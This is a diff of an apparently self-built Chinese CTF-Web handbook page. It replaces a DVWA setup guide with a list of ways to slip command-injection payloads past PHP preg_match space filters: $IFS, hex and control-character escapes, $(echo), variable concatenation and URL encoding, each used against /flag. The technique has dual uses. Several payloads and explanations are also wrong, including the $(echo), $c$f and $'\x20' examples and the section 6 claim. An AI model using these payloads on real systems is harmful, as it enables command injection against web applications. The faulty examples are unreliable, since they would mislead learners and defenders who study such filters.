@@ -12,13 +12,13 @@
         <meta name="author" content="wilesanGH">
       
       
-        <link rel="canonical" href="https://github.com/wilesanGH/DVWA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <link rel="canonical" href="https://github.com/wilesanGH/preg_match%20%E7%A9%BA%E6%A0%BC%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5/">
       
       
-        <link rel="prev" href="..">
+        <link rel="prev" href="../bash%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">
       
       
-        <link rel="next" href="../WebGoat%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">
+        <link rel="next" href="../RSA%E5%8E%9F%E7%90%86/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -26,7 +26,7 @@
     
     
       
-        <title>DVWA环境搭建 - CTF-Web修炼手册</title>
+        <title>preg_match空格检测绕过策略 - CTF-Web修炼手册</title>
       
     
     
@@ -80,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#dvwa" class="md-skip">
+        <a href="#1-preg_match-input" class="md-skip">
           跳转至
         </a>
       
@@ -114,7 +114,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              DVWA环境搭建
+              preg_match空格检测绕过策略
             
           </span>
         </div>
@@ -244,8 +244,6 @@
   
   
   
-    
-  
   
     
     
@@ -253,13 +251,11 @@
   
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
-        <a href="./" class="md-tabs__link">
+      <li class="md-tabs__item">
+        <a href="../DVWA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="md-tabs__link">
           
   
   
@@ -308,6 +304,8 @@
   
   
   
+    
+  
   
     
     
@@ -315,10 +313,12 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
+      <li class="md-tabs__item md-tabs__item--active">
         <a href="../php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8B%E7%BB%8D/" class="md-tabs__link">
           
   
@@ -485,31 +485,28 @@
       
   
   
-    
   
   
-  
     
     
     
     
-      
-        
-        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
         
           
-          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
             
   
   
@@ -522,7 +519,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             环境搭建
@@ -533,31 +530,28 @@
                 
   
   
-    
   
   
-  
     
     
     
     
       
       
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
         
           
-          
         
-      
-    
-    
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
-      
-        
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_1" >
         
           
-          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="">
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
             
   
   
@@ -570,7 +564,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2_1">
             <span class="md-nav__icon md-icon"></span>
             靶场环境
@@ -581,32 +575,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    DVWA环境搭建
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../DVWA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="md-nav__link">
         
   
   
@@ -617,86 +589,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#1-docker" class="md-nav__link">
-    <span class="md-ellipsis">
-      1. Docker 方式安装（推荐）
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="1. Docker 方式安装（推荐）">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#11-docker" class="md-nav__link">
-    <span class="md-ellipsis">
-      1.1 安装 Docker
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#12-dvwa" class="md-nav__link">
-    <span class="md-ellipsis">
-      1.2 部署 DVWA
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#2" class="md-nav__link">
-    <span class="md-ellipsis">
-      2. 初始化设置
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#3" class="md-nav__link">
-    <span class="md-ellipsis">
-      3. 常见问题
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#4" class="md-nav__link">
-    <span class="md-ellipsis">
-      4. 安全提示
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -838,13 +730,10 @@
       
       
         
-          
-          
-        
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
@@ -853,7 +742,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
         
           
-          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
             
   
   
@@ -917,13 +806,10 @@
       
       
         
-          
-          
-        
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
@@ -932,7 +818,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
         
           
-          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="">
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
             
   
   
@@ -1702,28 +1588,31 @@
       
   
   
+    
   
   
+  
     
     
     
     
+      
+        
+        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
         
           
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
-        
-          
-          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
             
   
   
@@ -1736,7 +1625,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             PHP安全
@@ -1756,10 +1645,13 @@
       
       
         
+          
+          
+        
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
@@ -1768,7 +1660,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_1" >
         
           
-          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="">
             
   
   
@@ -1892,28 +1784,31 @@
                 
   
   
+    
   
   
+  
     
     
     
     
       
       
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
         
           
+          
         
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_2" >
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" checked>
         
           
-          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="">
             
   
   
@@ -1926,7 +1821,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_4_2">
             <span class="md-nav__icon md-icon"></span>
             PHP绕过技巧
@@ -1960,10 +1855,30 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../preg_match%20%E7%A9%BA%E6%A0%BC%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    preg_match空格检测绕过策略
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1974,6 +1889,105 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-preg_match-input" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. 检测空格 (preg_match("/ /", $input))
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-preg_matchspace-input" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 检测任意空白字符 (preg_match("/[[:space:]]/", $input))
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-preg_match-input" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. 检测普通空格和其他字符 (preg_match("/ /", $input) + 空格和其他字符)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-preg_match-input" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. 检测以空格开头或结尾的命令（例如 preg_match("/^ /", $input)）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-preg_match-input" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. 检测空格作为分隔符（preg_match("/ /", $input) 与其他字符匹配）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-preg_matcha-za-z0-9-input" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. 检测非法字符或限制字符（preg_match("/[^a-zA-Z0-9]/", $input)）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-preg_matchcntrl-input" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. 检测分隔符或者控制符（preg_match("/[[:cntrl:]]/", $input)）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8" class="md-nav__link">
+    <span class="md-ellipsis">
+      8. 综合绕过（结合多个技术）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      🚀 总结
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -2380,8 +2394,6 @@
   
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -2390,60 +2402,81 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#1-docker" class="md-nav__link">
+  <a href="#1-preg_match-input" class="md-nav__link">
     <span class="md-ellipsis">
-      1. Docker 方式安装（推荐）
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="1. Docker 方式安装（推荐）">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#11-docker" class="md-nav__link">
-    <span class="md-ellipsis">
-      1.1 安装 Docker
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#12-dvwa" class="md-nav__link">
-    <span class="md-ellipsis">
-      1.2 部署 DVWA
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#2" class="md-nav__link">
-    <span class="md-ellipsis">
-      2. 初始化设置
+      1. 检测空格 (preg_match("/ /", $input))
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#3" class="md-nav__link">
+  <a href="#2-preg_matchspace-input" class="md-nav__link">
     <span class="md-ellipsis">
-      3. 常见问题
+      2. 检测任意空白字符 (preg_match("/[[:space:]]/", $input))
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#4" class="md-nav__link">
+  <a href="#3-preg_match-input" class="md-nav__link">
     <span class="md-ellipsis">
-      4. 安全提示
+      3. 检测普通空格和其他字符 (preg_match("/ /", $input) + 空格和其他字符)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-preg_match-input" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. 检测以空格开头或结尾的命令（例如 preg_match("/^ /", $input)）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-preg_match-input" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. 检测空格作为分隔符（preg_match("/ /", $input) 与其他字符匹配）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-preg_matcha-za-z0-9-input" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. 检测非法字符或限制字符（preg_match("/[^a-zA-Z0-9]/", $input)）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-preg_matchcntrl-input" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. 检测分隔符或者控制符（preg_match("/[[:cntrl:]]/", $input)）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8" class="md-nav__link">
+    <span class="md-ellipsis">
+      8. 综合绕过（结合多个技术）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      🚀 总结
     </span>
   </a>
   
@@ -2468,90 +2501,69 @@
   
 
 
-<h1 id="dvwa">DVWA 环境搭建指南<a class="headerlink" href="#dvwa" title="Permanent link">&para;</a></h1>
-<p>DVWA (Damn Vulnerable Web Application) 是一个用于安全测试和教学的故意存在漏洞的 PHP/MySQL Web 应用程序。本指南将介绍多种安装方式。</p>
-<h2 id="1-docker">1. Docker 方式安装（推荐）<a class="headerlink" href="#1-docker" title="Permanent link">&para;</a></h2>
-<h3 id="11-docker">1.1 安装 Docker<a class="headerlink" href="#11-docker" title="Permanent link">&para;</a></h3>
-<blockquote>
-<p>访问 <a href="https://www.docker.com/products/docker-desktop/">Docker 官网</a> 下载 Docker Desktop</p>
-<p>根据系统提示完成安装</p>
-<p>启动 Docker Desktop</p>
-<p>打开终端，验证安装：</p>
-</blockquote>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>docker<span class="w"> </span>--version
+<h2 id="1-preg_match-input">1. 检测空格 (<code>preg_match("/ /", $input)</code>)<a class="headerlink" href="#1-preg_match-input" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1">#使用 `$IFS`（内部字段分隔符），不直接输入空格：</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="c1">#`IFS` 默认是空格，所以它会把 `$IFS` 看作是空格，但不会被检测到。也可以用其他值修改 `IFS`，比如制表符（tab）等。</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>cat<span class="nv">$IFS</span>/flag
 </code></pre></div>
-<h3 id="12-dvwa">1.2 部署 DVWA<a class="headerlink" href="#12-dvwa" title="Permanent link">&para;</a></h3>
-<ol>
-<li>
-<p>拉取官方镜像：
-   <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>docker<span class="w"> </span>pull<span class="w"> </span>vulnerables/web-dvwa
-</code></pre></div></p>
-</li>
-<li>
-<p>运行容器：
-   <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>-dt<span class="w"> </span>-p<span class="w"> </span><span class="m">8082</span>:80<span class="w"> </span>vulnerables/web-dvwa
-</code></pre></div></p>
-</li>
-<li>
-<p>访问 DVWA：</p>
+<hr />
+<h2 id="2-preg_matchspace-input">2. 检测任意空白字符 (<code>preg_match("/[[:space:]]/", $input)</code>)<a class="headerlink" href="#2-preg_matchspace-input" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1">#使用十六进制表示空格（或其他空白字符）：</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1">#`[[:space:]]` 匹配空白字符，不仅是空格，可能包括制表符、换行符等。所以你可以利用十六进制值绕过空格匹配，使用其他空白字符如 tab（`\x09`）和换行（`\x0a`）。</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>cat<span class="s1">$&#39;\x20&#39;</span>/flag<span class="w">   </span><span class="c1"># 空格的十六进制表示</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>cat<span class="s1">$&#39;\x09&#39;</span>/flag<span class="w">   </span><span class="c1"># Tab的十六进制表示</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>cat<span class="s1">$&#39;\x0a&#39;</span>/flag<span class="w">   </span><span class="c1"># 换行符的十六进制表示</span>
+</code></pre></div>
+<hr />
+<h2 id="3-preg_match-input">3. 检测普通空格和其他字符 (<code>preg_match("/ /", $input)</code> + 空格和其他字符)<a class="headerlink" href="#3-preg_match-input" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1">#`$(echo)` 技巧，避免直接出现空格字符：</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c1">#`$(echo\ )` 会输出一个空格，但它并不会被 `preg_match(&quot;/ /&quot;, ...)` 直接匹配到，绕过了空格检测。</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>cat<span class="k">$(</span><span class="nb">echo</span><span class="k">)</span>/flag
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>cat<span class="k">$(</span>echo<span class="se">\ </span><span class="k">)</span>/flag
+</code></pre></div>
+<hr />
+<h2 id="4-preg_match-input">4. 检测以空格开头或结尾的命令（例如 <code>preg_match("/^ /", $input)</code>）<a class="headerlink" href="#4-preg_match-input" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1">#命令拼接或扩展：</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1">#避免了空格出现在开头或结尾，使用命令拼接的方式，规避了正则的直接匹配。</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nv">c</span><span class="o">=</span>cat<span class="p">;</span><span class="nv">f</span><span class="o">=</span>/flag<span class="p">;</span><span class="nv">$c$f</span>
+</code></pre></div>
+<hr />
+<h2 id="5-preg_match-input">5. 检测空格作为分隔符（<code>preg_match("/ /", $input)</code> 与其他字符匹配）<a class="headerlink" href="#5-preg_match-input" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1">#URL编码空格或替代符：</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="c1">#URL编码会被自动解码，这对于 Web 环境是很有效的。如果空格被转义成 `%20`，它在通过后端系统时会被还原为真正的空格。可以尝试其他编码来规避检测。</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>cat%20/flag<span class="w">  </span><span class="c1"># 空格的URL编码</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>cat%09/flag<span class="w">  </span><span class="c1"># tab制表符的URL编码</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>cat%0a/flag<span class="w">  </span><span class="c1"># 换行符的URL编码</span>
+</code></pre></div>
+<hr />
+<h2 id="6-preg_matcha-za-z0-9-input">6. 检测非法字符或限制字符（<code>preg_match("/[^a-zA-Z0-9]/", $input)</code>）<a class="headerlink" href="#6-preg_matcha-za-z0-9-input" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1">#使用可视字符，但不会被匹配：</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1">#（`\x20` 是空格的十六进制表示）通过十六进制或转义字符来替代普通字符，不会被常见的字符范围限制（如 `a-zA-Z0-9`）匹配到。</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>cat<span class="s1">$&#39;\x20&#39;</span>/flag
+</code></pre></div>
+<hr />
+<h2 id="7-preg_matchcntrl-input">7. 检测分隔符或者控制符（<code>preg_match("/[[:cntrl:]]/", $input)</code>）<a class="headerlink" href="#7-preg_matchcntrl-input" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1">#使用**控制字符**绕过：</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c1">#`[[:cntrl:]]` 匹配任何控制字符，类似于制表符、换行符、回车符等。通过利用可控制字符来绕过空格检测，完成命令注入。</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>cat<span class="s1">$&#39;\x1b&#39;</span>/flag<span class="w">   </span><span class="c1"># Escape字符（\x1b）</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>cat<span class="s1">$&#39;\x0a&#39;</span>/flag<span class="w">   </span><span class="c1"># 换行符（\x0a）</span>
+</code></pre></div>
+<hr />
+<h2 id="8">8. 综合绕过（结合多个技术）<a class="headerlink" href="#8" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>绕过方法</strong>：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1">#将多个技术结合使用：</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="c1">#此方法结合了 `$(echo)`（输出空格）和 `$&#39;\x20&#39;`（空格的十六进制形式），适用于复杂的绕过场景，能充分避免正则的匹配。</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>cat<span class="k">$(</span>echo<span class="se">\ </span><span class="k">)</span><span class="s1">$&#39;\x20&#39;</span>/flag
+</code></pre></div>
+<hr />
+<h1 id="_1">🚀 总结<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
 <blockquote>
-<p>打开浏览器，访问 <code>http://localhost:8082</code></p>
-<p>默认登录凭据：</p>
-<p>用户名：<code>admin</code></p>
-<p>密码：<code>password</code></p>
-</blockquote>
-</li>
-</ol>
-<h2 id="2">2. 初始化设置<a class="headerlink" href="#2" title="Permanent link">&para;</a></h2>
-<ol>
-<li>访问 DVWA：</li>
-</ol>
-<blockquote>
-<p>打开浏览器访问对应地址</p>
-<p>使用默认凭据登录</p>
-</blockquote>
-<ol>
-<li>初始化数据库：</li>
-</ol>
-<blockquote>
-<p>点击页面底部的 "Setup / Reset DB"</p>
-<p>点击 "Create / Reset Database" 按钮</p>
-</blockquote>
-<ol>
-<li>安全级别设置：</li>
-</ol>
-<blockquote>
-<p>登录后，点击 "DVWA Security"</p>
-<p>选择难度级别（Low/Medium/High/Impossible）</p>
-</blockquote>
-<h2 id="3">3. 常见问题<a class="headerlink" href="#3" title="Permanent link">&para;</a></h2>
-<ol>
-<li>数据库连接失败：</li>
-</ol>
-<blockquote>
-<p>检查数据库服务是否启动</p>
-<p>验证数据库凭据是否正确</p>
-<p>确认数据库用户权限</p>
-</blockquote>
-<ol>
-<li>文件权限问题：</li>
-</ol>
-<blockquote>
-<p>确保 Web 服务器对 DVWA 目录有正确的读写权限</p>
-<p>检查 <code>hackable/uploads/</code> 和 <code>/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</code> 的权限</p>
-</blockquote>
-<ol>
-<li>reCAPTCHA 问题：<blockquote>
-<p>如需使用 reCAPTCHA，需要在 <code>config.inc.php</code> 中配置有效的 API 密钥</p>
-</blockquote>
-</li>
-</ol>
-<h2 id="4">4. 安全提示<a class="headerlink" href="#4" title="Permanent link">&para;</a></h2>
-<blockquote>
-<p>DVWA 仅用于学习和测试目的</p>
-<p>不要在生产环境中部署</p>
-<p>建议在隔离的虚拟机或容器中运行</p>
-<p>完成练习后及时关闭环境 </p>
+<p><code>preg_match("/ /", $input)</code> 通常用于检测空格，但只要你巧妙利用 Linux 中的各种技巧（比如 <code>$IFS</code>、<code>$(echo)</code>、十六进制表示等），就能绕过这类检测。</p>
+<p>如果正则使用了更广泛的空白字符匹配（如 <code>[[:space:]]</code>），你可以尝试使用<strong>控制字符</strong>、<strong>URL编码</strong>或<strong>十六进制表示</strong>来绕过。</p>
+<p>需要时，结合多个技巧一起用，能应对更复杂的过滤或检测。</p>
 </blockquote>
 
 
